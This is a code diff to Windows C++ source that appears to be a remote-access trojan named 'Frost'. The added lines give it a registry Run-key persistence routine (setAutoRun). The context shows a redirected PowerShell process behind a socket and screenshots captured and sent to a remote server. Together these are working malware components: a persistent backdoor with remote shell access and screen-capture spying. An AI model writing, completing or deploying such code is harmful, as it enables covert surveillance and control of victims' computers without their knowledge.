@@ -16,6 +16,22 @@ HANDLE newStdIn, writeStdIn;
 HANDLE newStdOut, readStdOut;
 PROCESS_INFORMATION powershell;
 
+void setAutoRun()
+{
+    wchar_t filePath[MAX_PATH];
+
+    GetModuleFileNameW(NULL, filePath, 264);
+    HKEY keyHandle;
+    //Note to self: do not put backslash before SOFTWARE
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &keyHandle) == ERROR_SUCCESS)
+    {
+        //test if we added the path before
+        if (RegQueryValueExA(keyHandle, "Frost", NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
+            RegSetKeyValueW(keyHandle, NULL, L"Frost", REG_SZ, filePath, wcslen(filePath));
+    }
+    RegCloseKey(keyHandle);
+}
+
 bool initWSA()
 {
     WSADATA wsaData;
@@ -270,6 +286,7 @@ int captureScreen(SOCKET s)
     }
     Gdiplus::GdiplusShutdown(gdiplusToken);
 
+    //send the image to the server
     ULARGE_INTEGER liSize;
     IStream_Reset(istream);
     IStream_Size(istream, &liSize);
@@ -312,6 +329,7 @@ void cleanUp()
 
 int main()
 { 
+    //setAutoRun();
     initWSA();
 
     int iResult;
